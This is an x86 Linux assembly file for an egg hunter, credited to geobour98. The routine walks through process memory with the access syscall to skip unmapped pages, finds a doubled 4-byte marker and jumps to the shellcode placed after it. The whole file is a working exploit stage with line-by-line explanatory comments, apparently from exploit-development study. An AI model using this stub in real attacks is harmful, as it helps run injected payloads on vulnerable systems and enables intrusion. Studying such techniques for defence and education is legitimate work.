; Egg Hunter
; Author: geobour98 

global _start

section .text

_start:
	mov ebx, 0x50905090	; move the 4 bytes egg in ebx

	xor ecx, ecx		; clear ecx register
	mul ecx			; multiply ecx with eax and store upper bits in edx and lower in eax, both 0

next_page:
	or dx, 0xfff		; page alignment operation
				; default page size is 4096 bytes (next_page + next_address = 4096 => 4095 + 1 = 4096)

next_address:
	inc edx			; increment edx by 1 to reach the page size of 4096
	
	pusha			; push all registers on the stack
	lea ebx, [edx + 0x4]	; ebx is set with the value of edx plus 4, so 8 bytes are validated at once

	mov al, 0x21		; 21 is the hex value of the decimal 33 for access syscall

	int 0x80		; exec access syscall

	cmp al, 0xf2		; compare return value of accept with 0xf2 (low byte of EFAULT return value)

	popa			; pop all registers from the stack

	jz next_page		; jump short to next_page if zero (ZF = 1)

	cmp [edx], ebx		; if the egg in ebx doesn't match edx content go to the next address
	jnz next_address	; jump short if not zero (ZF = 0)

	cmp [edx + 0x4], ebx	; if the egg in ebx doesn't match edx+4 content go to the next address again
	jnz next_address	; jump short if not zero (ZF = 0)

	jmp edx			; egg is found, jump short at edx (our shellcode)
